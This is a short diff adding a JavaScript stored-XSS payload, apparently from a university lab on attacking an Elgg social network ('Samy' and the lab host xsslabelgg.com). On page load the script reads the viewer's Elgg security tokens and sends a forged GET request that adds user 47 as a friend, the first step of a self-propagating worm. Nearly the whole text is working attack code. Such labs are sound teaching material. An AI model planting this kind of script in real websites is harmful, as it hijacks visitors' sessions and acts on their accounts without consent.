@@ -1,0 +1,19 @@
+<script type="text/javascript">
+window.onload = function () {
+    // 1. Samy's Friend ID
+    var friendID = 47; 
+    
+    // 2. Build the URL using the session tokens
+    var sendurl = "http://www.xsslabelgg.com/action/friends/add"
+                + "?friend=" + friendID
+                + "&__elgg_ts=" + elgg.security.token.__elgg_ts
+                + "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+    // 3. Create the Ajax request
+    var Ajax = new XMLHttpRequest();
+    Ajax.open("GET", sendurl, true); 
+    Ajax.setRequestHeader("Host", "www.xsslabelgg.com"); 
+    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    Ajax.send(); 
+}
+</script>
